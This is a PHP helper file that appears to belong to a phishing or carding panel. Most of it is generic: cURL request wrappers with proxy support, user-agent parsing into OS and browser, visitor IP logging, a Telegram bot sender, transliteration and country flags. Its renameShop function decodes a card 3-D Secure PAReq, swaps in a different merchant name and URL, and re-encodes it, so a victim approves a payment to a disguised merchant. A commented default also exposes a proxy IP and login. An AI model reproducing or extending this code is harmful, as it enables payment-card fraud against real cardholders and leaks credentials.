<?php 

	if(isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
		$_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
	}

	if(!function_exists('post')) {
		function post($url = null, $params = null, $proxy = null, $proxy_userpwd = null) {
			$ch = curl_init();

			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_HEADER, 1);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);

			if(isset($params['params'])) {
				curl_setopt($ch, CURLOPT_POST, 1);
				curl_setopt($ch, CURLOPT_POSTFIELDS, $params['params']);
			}

			if(isset($params['headers'])) {
				curl_setopt($ch, CURLOPT_HTTPHEADER, $params['headers']);
			}

			if(isset($params['cookies'])) {
				curl_setopt($ch, CURLOPT_COOKIE, $params['cookies']);
			}

			if($proxy) {
				curl_setopt($ch, CURLOPT_PROXY, $proxy);

				if($proxy_userpwd) {
					curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy_userpwd);
				}
			}

			$result = curl_exec($ch);
			$result_explode = explode("\r\n\r\n", $result);

			$headers = ((isset($result_explode[0])) ? $result_explode[0]."\r\n" : '').''.((isset($result_explode[1])) ? $result_explode[1] : '');
			$content = $result_explode[count($result_explode) - 1];

			preg_match_all('|Set-Cookie: (.*);|U', $headers, $parse_cookies);

			$cookies = implode(';', $parse_cookies[1]);

			curl_close($ch);

			return array('headers' => $headers, 'cookies' => $cookies, 'content' => $content);
		}
	}
	
	if(!function_exists('request')) {
		function request($method = "GET", $url = null, $params = null, $proxy = null/*'192.109.100.97:8000'*/, $proxy_userpwd = null/*'915J0n:9Uwt9g'*/) {
			$ch = curl_init();

			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_HEADER, 1);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

			if($method == "POST") {
				curl_setopt($ch, CURLOPT_POST, 1);
				curl_setopt($ch, CURLOPT_POSTFIELDS, $params['params']);
			} else {
				curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
			}

			if(isset($params['headers'])) {
				curl_setopt($ch, CURLOPT_HTTPHEADER, $params['headers']);
			}

			if(isset($params['cookies'])) {
				curl_setopt($ch, CURLOPT_COOKIE, $params['cookies']);
			}

			if($proxy) {
				curl_setopt($ch, CURLOPT_PROXY, $proxy);

				if($proxy_userpwd) {
					curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy_userpwd);
				}
			}

			$result = curl_exec($ch);
			
			$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
			$headers = substr($result, 0, $header_size);
			$content = substr($result, $header_size);
			
			preg_match_all('|Set-Cookie: (.*);|U', $headers, $parse_cookies);
			$cookies = implode(';', $parse_cookies[1]);

			curl_close($ch);

			return array('headers' => $headers, 'cookies' => $cookies, 'content' => $content);
		}
	}
	
	if(!function_exists('renameShop')) {
		function renameShop($pareq, $to_name, $to_link){
			$defaultPareq = base64_decode($pareq);
			$ThreeDSecureData = zlib_decode($defaultPareq);
			$ThreeDSecureDataXML = new \SimpleXMLElement($ThreeDSecureData);
			foreach($ThreeDSecureDataXML->xpath('/ThreeDSecure/Message/PAReq/Merchant') as $threeData) {
				$threeData->name = $to_name;
				$threeData->url = $to_link;
			}
			$ThreeDSecureData = $ThreeDSecureDataXML->asXML();
			$ThreeDSecureData = zlib_encode($ThreeDSecureData, ZLIB_ENCODING_DEFLATE);
			$ThreeDSecureData = base64_encode($ThreeDSecureData);
			return $ThreeDSecureData;
		}
	}
	
	if(!function_exists('getInputsHTML')) {
		function getInputsHTML($html) {
			$dom = new DOMDocument();
			$dom->loadHTML($html);

			$xpath = new DOMXPath($dom);

			$tags = $xpath->query('//input');
			foreach ($tags as $tag) {
				$elems[trim($tag->getAttribute('name'))] = trim($tag->getAttribute('value'));
			}
			return $elems;
		}
	}
	
	if(!function_exists('random')) {
		function random() {
			return (float)rand()/(float)getrandmax();
		}
	}
	
	if(!function_exists('curl_get_contents')) {
		function curl_get_contents($url) {
			$curl = curl_init($url);
			curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
			curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
			$data = curl_exec($curl);
			curl_close($curl);
			return $data;
		}
	}
	
	function isMobile() { 
		return preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
	}
	
	if(!function_exists('checkMobileDevice')) {
		function checkMobileDevice($userAgent) {
			if(preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]) == TRUE) {
				return '1';
			} else {
				return '0';
			}
		}
	}
	
	if (!function_exists('mb_ucfirst') AND extension_loaded('mbstring')) {
		function mb_ucfirst($str, $encoding='UTF-8') {
			$str = mb_ereg_replace('^[\ ]+', '', $str);
			$str = mb_strtoupper(mb_substr($str, 0, 1, $encoding), $encoding).
				   mb_substr($str, 1, mb_strlen($str), $encoding);
			return $str;
		}
	}
	
	if(!function_exists('get_string_between')) {
		function get_string_between($string, $start, $end){
			$string = ' ' . $string;
			$ini = strpos($string, $start);
			if ($ini == 0) return '';
			$ini += strlen($start);
			$len = strpos($string, $end, $ini) - $ini;
			return substr($string, $ini, $len);
		}
	}
	
	if(!function_exists('getOS')) {
		function getOS($userAgent) {
			$oses = array (
				'Windows 3.11' => '(Win16)',
				'Windows 95' => '(Windows 95)|(Win95)|(Windows_95)',
				'Windows 98' => '(Windows 98)|(Win98)',
				'Windows 2000' => '(Windows NT 5.0)|(Windows 2000)',
				'Windows 2000 Service Pack 1' => '(Windows NT 5.01)',
				'Windows XP' => '(Windows NT 5.1)|(Windows XP)',
				'Windows Server 2003' => '(Windows NT 5.2)',
				'Windows Vista' => '(Windows NT 6.0)|(Windows Vista)',
				'Windows 7' => '(Windows NT 6.1)|(Windows 7)',
				'Windows 8' => '(Windows NT 6.2)|(Windows 8)',
				'Windows 8.1' => '(Windows NT 6.3)',
				'Windows 10' => '(Windows NT 10.0)|(Windows NT 6.4)',
				'Windows NT 4.0' => '(Windows NT 4.0)|(WinNT4.0)|(WinNT)|(Windows NT)',
				'Windows ME' => '(Windows ME)|(Windows 98; Win 9x 4.90 )',
				'Windows CE' => '(Windows CE)',
				'iOS' => '(iPad)',
				'iOS' => '(iPhone)',
				'Mac OS X Kodiak (beta)' => '(Mac OS X beta)',
				'Mac OS X Cheetah' => '(Mac OS X 10.0)',
				'Mac OS X Puma' => '(Mac OS X 10.1)',
				'Mac OS X Jaguar' => '(Mac OS X 10.2)',
				'Mac OS X Panther' => '(Mac OS X 10.3)',
				'Mac OS X Tiger' => '(Mac OS X 10.4)',
				'Mac OS X Leopard' => '(Mac OS X 10.5)',
				'Mac OS X Snow Leopard' => '(Mac OS X 10.6)',
				'Mac OS X Lion' => '(Mac OS X 10.7)',
				'Mac OS X' => '(Mac OS X)',
				'Mac OS' => '(Mac_PowerPC)|(PowerPC)|(Macintosh)',
				'Open BSD' => '(OpenBSD)',
				'SunOS' => '(SunOS)',
				'Solaris 11' => '(Solaris\/11)|(Solaris11)',
				'Solaris 10' => '((Solaris\/10)|(Solaris10))',
				'Solaris 9' => '((Solaris\/9)|(Solaris9))',
				'CentOS' => '(CentOS)',
				'QNX' => '(QNX)',
				'UNIX' => '(UNIX)',
				'Ubuntu 12.10' => '(Ubuntu\/12.10)|(Ubuntu 12.10)',
				'Ubuntu 12.04 LTS' => '(Ubuntu\/12.04)|(Ubuntu 12.04)',
				'Ubuntu 11.10' => '(Ubuntu\/11.10)|(Ubuntu 11.10)',
				'Ubuntu 11.04' => '(Ubuntu\/11.04)|(Ubuntu 11.04)',
				'Ubuntu 10.10' => '(Ubuntu\/10.10)|(Ubuntu 10.10)',
				'Ubuntu 10.04 LTS' => '(Ubuntu\/10.04)|(Ubuntu 10.04)',
				'Ubuntu 9.10' => '(Ubuntu\/9.10)|(Ubuntu 9.10)',
				'Ubuntu 9.04' => '(Ubuntu\/9.04)|(Ubuntu 9.04)',
				'Ubuntu 8.10' => '(Ubuntu\/8.10)|(Ubuntu 8.10)',
				'Ubuntu 8.04 LTS' => '(Ubuntu\/8.04)|(Ubuntu 8.04)',
				'Ubuntu 6.06 LTS' => '(Ubuntu\/6.06)|(Ubuntu 6.06)',
				'Red Hat Linux' => '(Red Hat)',
				'Red Hat Enterprise Linux' => '(Red Hat Enterprise)',
				'Fedora 17' => '(Fedora\/17)|(Fedora 17)',
				'Fedora 16' => '(Fedora\/16)|(Fedora 16)',
				'Fedora 15' => '(Fedora\/15)|(Fedora 15)',
				'Fedora 14' => '(Fedora\/14)|(Fedora 14)',
				'Chromium OS' => '(ChromiumOS)',
				'Google Chrome OS' => '(ChromeOS)',
				'Android' => '(Android)',
				'Linux' => '(Linux)|(X11)',
				'OpenBSD' => '(OpenBSD)',
				'FreeBSD' => '(FreeBSD)',
				'NetBSD' => '(NetBSD)',
				'iPod' => '(iPod)',
				'iPhone' => '(iPhone)',
				'iPad' => '(iPad)',
				'OS/8' => '(OS\/8)|(OS8)',
				'Older DEC OS' => '(DEC)|(RSTS)|(RSTS\/E)',
				'WPS-8' => '(WPS-8)|(WPS8)',
				'BeOS' => '(BeOS)|(BeOS r5)',
				'BeIA' => '(BeIA)',
				'OS/2 2.0' => '(OS\/220)|(OS\/2 2.0)',
				'OS/2' => '(OS\/2)|(OS2)',
				'Search engine or robot' => '(nuhk)|(Googlebot)|(Yammybot)|(Openbot)|(Slurp)|(msnbot)|(Ask Jeeves\/Teoma)|(ia_archiver)'
			);

			foreach($oses as $os=>$pattern){
				if(preg_match("/$pattern/i", $userAgent)) {
					return $os;
				}
			}
			
			return "Unknown";
		}
	}
	
	if(!function_exists('getBrowser')) {
		function getBrowser($userAgent) {
			$browsers = array (
				'Mozilla Firefox' => 'Firefox',
				'Opera' => 'Opera',
				'Yandex' => 'YaBrowser',
				'Google Chrome' => 'Chrome',
				'Internet Explorer' => 'MSIE',
				'Apple Safari' => 'Safari',
				'Konqueror' => 'Konqueror',
				'Debian Iceweasel' => 'Iceweasel',
				'SeaMonkey' => 'SeaMonkey',
				'Microsoft Edge' => 'Edge',
				'MyIE' => 'myie',
				'Netscape' => 'netscape',
				'Mozilla' => 'mozilla',
				'Opera Mini' => 'opera mini',
				'Sylera' => 'sylera',
				'Songbird' => 'songbird',
				'Firebird' => 'firebird',
				'GranParadiso' => 'paradiso',
				'Phoenix' => 'phoenix',
				'Powermarks' => 'powermarks',
				'FreeBSD' => 'freebsd',
				'Lynx' => 'Lynx',
				'PlayStation' => 'playstation',
				'NetPositive' => 'netpositive',
				'Minimo' => 'minimo',
				'Links' => 'links',
				'K-Meleon' => 'k-meleon',
				'IceCat' => 'icecat',
				'Flock' => 'Flock',
				'Epiphany' => 'Epiphany',
				'Camino' => 'Camino',
				'Avant Browser' => 'avant browser',
				'America Online' => 'america online',
				'Amaya' => 'amaya'
			);

			foreach($browsers as $browser=>$pattern){
				if(preg_match("/$pattern/i", $userAgent)) {
					return $browser;
				}
			}
			
			return "Unknown";
		}
	}
	
	if(!function_exists('Endings')) {
		function Endings($string, $ch1, $ch2, $ch3) {
			$ff = Array('0','1','2','3','4','5','6','7','8','9');
			if(substr($string,-2, 1) == 1 AND strlen($string) > 1) $ry = Array("0 $ch3", "1 $ch3", "2 $ch3", "3 $ch3", "4 $ch3", "5 $ch3", "6 $ch3", "7 $ch3", "8 $ch3", "9 $ch3");
			else $ry = Array("0 $ch3", "1 $ch1", "2 $ch2", "3 $ch2", "4 $ch2", "5 $ch3", "6 $ch3", "7 $ch3", "8 $ch3", "9 $ch3");
			$string1 = substr($string,0,-1).str_replace($ff, $ry, substr($string,-1,1));
			return $string1;
		}
	}
	
	if(!function_exists('seconds2times')) {
		function seconds2times($seconds) {
			$times = array();
			$count_zero = false;
			$periods = array(60, 3600, 86400, 31536000);
			
			for ($i = 3; $i >= 0; $i--) {
				$period = floor($seconds/$periods[$i]);
				if (($period > 0) OR ($period == 0 AND $count_zero)) {
					$times[$i+1] = $period;
					$seconds -= $period * $periods[$i];
					$count_zero = true;
				}
			}
			
			$times[0] = $seconds;
			return $times;
		}
	}
	
	if(!function_exists('send')) {
		function send($token, $method, $params = Array()) {
			return json_decode(curl_get_contents("https://api.telegram.org/bot$token/$method?".http_build_query($params)));
		}
	}
	
	if(!function_exists('rus2translit')) {
		function rus2translit($text) {
			$rus_alphabet = Array(
				'А', 'Б', 'В', 'Г', 'Д', 'Е', 'Ё', 'Ж', 'З', 'И', 'Й',
				'К', 'Л', 'М', 'Н', 'О', 'П', 'Р', 'С', 'Т', 'У', 'Ф',
				'Х', 'Ц', 'Ч', 'Ш', 'Щ', 'Ъ', 'Ы', 'Ь', 'Э', 'Ю', 'Я',
				'а', 'б', 'в', 'г', 'д', 'е', 'ё', 'ж', 'з', 'и', 'й',
				'к', 'л', 'м', 'н', 'о', 'п', 'р', 'с', 'т', 'у', 'ф',
				'х', 'ц', 'ч', 'ш', 'щ', 'ъ', 'ы', 'ь', 'э', 'ю', 'я'
			);
		
			$rus_alphabet_translit = Array(
				'A', 'B', 'V', 'G', 'D', 'E', 'E', 'ZH', 'Z', 'I', 'I',
				'K', 'L', 'M', 'N', 'O', 'P', 'R', 'S', 'T', 'U', 'F',
				'H', 'C', 'CH', 'SH', 'SH', '`', 'Y', '`', 'E', 'IU', 'YA',
				'a', 'b', 'v', 'g', 'd', 'e', 'E', 'zh', 'z', 'i', 'i',
				'k', 'l', 'm', 'n', 'o', 'p', 'r', 's', 't', 'u', 'f',
				'h', 'c', 'ch', 'sh', 'sh', '`', 'y', '`', 'e', 'iu', 'ya'
			);
			
			return str_replace($rus_alphabet, $rus_alphabet_translit, $text);
		}
	}
	
	if(!function_exists('getCountryFlag')) {
		function getCountryFlag($country) {
			$flags = Array(
				'AF' => '🇦🇫',
				'AX' => '🇦🇽',
				'AL' => '🇦🇱',
				'DZ' => '🇩🇿',
				'AS' => '🇦🇸',
				'AD' => '🇦🇩',
				'AO' => '🇦🇴',
				'AI' => '🇦🇮',
				'AQ' => '🇦🇶',
				'AG' => '🇦🇬',
				'AR' => '🇦🇷',
				'AM' => '🇦🇲',
				'AW' => '🇦🇼',
				'AU' => '🇦🇺',
				'AT' => '🇦🇹',
				'AZ' => '🇦🇿',
				'BS' => '🇧🇸',
				'BH' => '🇧🇭',
				'BD' => '🇧🇩',
				'BB' => '🇧🇧',
				'BY' => '🇧🇾',
				'BE' => '🇧🇪',
				'BZ' => '🇧🇿',
				'BJ' => '🇧🇯',
				'BM' => '🇧🇲',
				'BT' => '🇧🇹',
				'BO' => '🇧🇴',
				'BA' => '🇧🇦',
				'BW' => '🇧🇼',
				'BR' => '🇧🇷',
				'IO' => '🇮🇴',
				'VG' => '🇻🇬',
				'BN' => 'BN',
				'BG' => '🇧🇬',
				'BF' => '🇧🇫',
				'BI' => '🇧🇮',
				'KH' => '🇰🇭',
				'CM' => '🇨🇲',
				'CA' => '🇨🇦',
				'IC' => '🇮🇨',
				'CV' => '🇨🇻',
				'BQ' => '🇧🇶',
				'KY' => '🇰🇾',
				'CF' => '🇨🇫',
				'TD' => '🇹🇩',
				'CL' => '🇨🇱',
				'CN' => '🇨🇳',
				'CX' => '🇨🇽',
				'CC' => '🇨🇨',
				'CO' => '🇨🇴',
				'KM' => '🇰🇲',
				'CG' => '🇨🇬',
				'CD' => '🇨🇩',
				'CK' => '🇨🇰',
				'CR' => '🇨🇷',
				'CI' => '🇨🇮',
				'HR' => '🇭🇷',
				'CU' => '🇨🇺',
				'CW' => '🇨🇼',
				'CY' => '🇨🇾',
				'CZ' => '🇨🇿',
				'DK' => '🇩🇰',
				'DJ' => '🇩🇯',
				'DM' => '🇩🇲',
				'DO' => '🇩🇴',
				'EC' => '🇪🇨',
				'EG' => '🇪🇬',
				'SV' => '🇸🇻',
				'GQ' => '🇬🇶',
				'ER' => '🇪🇷',
				'EE' => '🇪🇪',
				'ET' => '🇪🇹',
				'EU' => '🇪🇺',
				'FK' => '🇫🇰',
				'FO' => '🇫🇴',
				'FJ' => '🇫🇯',
				'FI' => '🇫🇮',
				'FR' => '🇫🇷',
				'GF' => '🇬🇫',
				'PF' => '🇵🇫',
				'TF' => '🇹🇫',
				'GA' => '🇬🇦',
				'GM' => '🇬🇲',
				'GE' => '🇬🇪',
				'DE' => '🇩🇪',
				'GH' => '🇬🇭',
				'GI' => '🇬🇮',
				'GR' => '🇬🇷',
				'GL' => '🇬🇱',
				'GD' => '🇬🇩',
				'GP' => '🇬🇵',
				'GU' => '🇬🇺',
				'GT' => '🇬🇹',
				'GG' => '🇬🇬',
				'GN' => '🇬🇳',
				'GW' => '🇬🇼',
				'GY' => '🇬🇾',
				'HT' => '🇭🇹',
				'HN' => '🇭🇳',
				'HK' => '🇭🇰',
				'HU' => '🇭🇺',
				'IS' => '🇮🇸',
				'IN' => '🇮🇳',
				'ID' => '🇮🇩',
				'IR' => '🇮🇷',
				'IQ' => '🇮🇶',
				'IE' => '🇮🇪',
				'IM' => '🇮🇲',
				'IL' => '🇮🇱',
				'IT' => '🇮🇹',
				'JM' => '🇯🇲',
				'JP' => '🇯🇵',
				'JE' => '🇯🇪',
				'JO' => '🇯🇴',
				'KZ' => '🇰🇿',
				'KE' => '🇰🇪',
				'KI' => '🇰🇮',
				'XK' => '🇽🇰',
				'KW' => '🇰🇼',
				'KG' => '🇰🇬',
				'LA' => '🇱🇦',
				'LV' => '🇱🇻',
				'LB' => '🇱🇧',
				'LS' => '🇱🇸',
				'LR' => '🇱🇷',
				'LY' => '🇱🇾',
				'LI' => '🇱🇮',
				'LT' => '🇱🇹',
				'LU' => '🇱🇺',
				'MO' => '🇲🇴',
				'MK' => '🇲🇰',
				'MG' => '🇲🇬',
				'MW' => '🇲🇼',
				'MY' => '🇲🇾',
				'MV' => '🇲🇻',
				'ML' => '🇲🇱',
				'MT' => '🇲🇹',
				'MH' => '🇲🇭',
				'MQ' => '🇲🇶',
				'MR' => '🇲🇷',
				'MU' => '🇲🇺',
				'YT' => '🇾🇹',
				'MX' => '🇲🇽',
				'FM' => '🇫🇲',
				'MD' => '🇲🇩',
				'MC' => '🇲🇨',
				'MN' => '🇲🇳',
				'ME' => '🇲🇪',
				'MS' => '🇲🇸',
				'MA' => '🇲🇦',
				'MZ' => '🇲🇿',
				'MM' => '🇲🇲',
				'NA' => '🇳🇦',
				'NR' => '🇳🇷',
				'NP' => '🇳🇵',
				'NL' => '🇳🇱',
				'NC' => '🇳🇨',
				'NZ' => '🇳🇿',
				'NI' => '🇳🇮',
				'NE' => '🇳🇪',
				'NG' => '🇳🇬',
				'NU' => '🇳🇺',
				'NF' => '🇳🇫',
				'KP' => '🇰🇵',
				'MP' => '🇲🇵',
				'NO' => '🇳🇴',
				'OM' => '🇴🇲',
				'PK' => '🇵🇰',
				'PW' => '🇵🇼',
				'PS' => '🇵🇸',
				'PA' => '🇵🇦',
				'PG' => '🇵🇬',
				'PY' => '🇵🇾',
				'QA' => '🇶🇦',
				'RE' => '🇷🇪',
				'RO' => '🇷🇴',
				'RU' => '🇷🇺',
				'RW' => '🇷🇼',
				'WS' => '🇼🇸',
				'SM' => '🇸🇲',
				'ST' => '🇸🇹',
				'SA' => '🇸🇦',
				'SN' => '🇸🇳',
				'RS' => '🇷🇸',
				'SC' => '🇸🇨',
				'SL' => '🇸🇱',
				'SG' => '🇸🇬',
				'SX' => '🇸🇽',
				'SK' => '🇸🇰',
				'SI' => '🇸🇮',
				'GS' => '🇬🇸',
				'SB' => '🇸🇧',
				'SO' => '🇸🇴',
				'ZA' => '🇿🇦',
				'KR' => '🇰🇷',
				'SS' => '🇸🇸',
				'ES' => '🇪🇸',
				'LK' => '🇱🇰',
				'BL' => '🇧🇱',
				'SH' => '🇸🇭',
				'KN' => '🇰🇳',
				'LC' => '🇱🇨',
				'PM' => '🇵🇲',
				'VC' => '🇻🇨',
				'SD' => '🇸🇩',
				'SR' => '🇸🇷',
				'SZ' => '🇸🇿',
				'SE' => '🇸🇪',
				'CH' => '🇨🇭',
				'SY' => '🇸🇾',
				'TW' => '🇹🇼',
				'TJ' => '🇹🇯',
				'TZ' => '🇹🇿',
				'TH' => '🇹🇭',
				'TL' => '🇹🇱',
				'TG' => '🇹🇬',
				'TK' => '🇹🇰',
				'TO' => '🇹🇴',
				'TT' => '🇹🇹',
				'TN' => '🇹🇳',
				'TR' => '🇹🇷',
				'TM' => '🇹🇲',
				'TC' => '🇹🇨',
				'TV' => '🇹🇻',
				'VI' => '🇻🇮',
				'UG' => '🇺🇬',
				'UA' => '🇺🇦',
				'AE' => '🇦🇪',
				'GB' => '🇬🇧',
				'US' => '🇺🇸',
				'UY' => '🇺🇾',
				'UZ' => '🇺🇿',
				'VU' => '🇻🇺',
				'VA' => '🇻🇦',
				'VE' => '🇻🇪',
				'VN' => '🇻🇳',
				'WF' => '🇼🇫',
				'EH' => '🇪🇭',
				'YE' => '🇾🇪',
				'ZM' => '🇿🇲',
				'ZW' => '🇿🇼'
			);
			
			if(isset($flags[$country])) {
				return $flags[$country];
			}
		}
	}
	
	$visitor = Array(
		'mobile' => checkMobileDevice($_SERVER['HTTP_USER_AGENT']),
		'ip' => $_SERVER['REMOTE_ADDR'],
		'os' => getOS($_SERVER['HTTP_USER_AGENT']),
		'browser' => getBrowser($_SERVER['HTTP_USER_AGENT'])
	);
	
	
	if(!empty($ipcheck)) {
		$ipapi = json_decode($ipcheck);
		if(!empty($ipapi->{'countryCode'})) {
			$visitor['country_code'] = $ipapi->{'countryCode'};
		} else {
			$visitor['country_code'] = 'Unknown';
		}
		if(!empty($ipapi->{'country'})) {
			$visitor['country'] = $ipapi->{'country'};
		} else {
			$visitor['country'] = 'Unknown';
		}
		if(!empty($ipapi->{'city'})) {
			$visitor['city'] = $ipapi->{'city'};
		} else {
			$visitor['city'] = 'Unknown';
		}
	} else {
		$visitor['country_code'] = 'Unknown';
		$visitor['country'] = 'Unknown';
		$visitor['city'] = 'Unknown';
	}
	
	$config = mysqli_fetch_assoc(mysqli_query($connection, "SELECT * FROM `config`"));

?>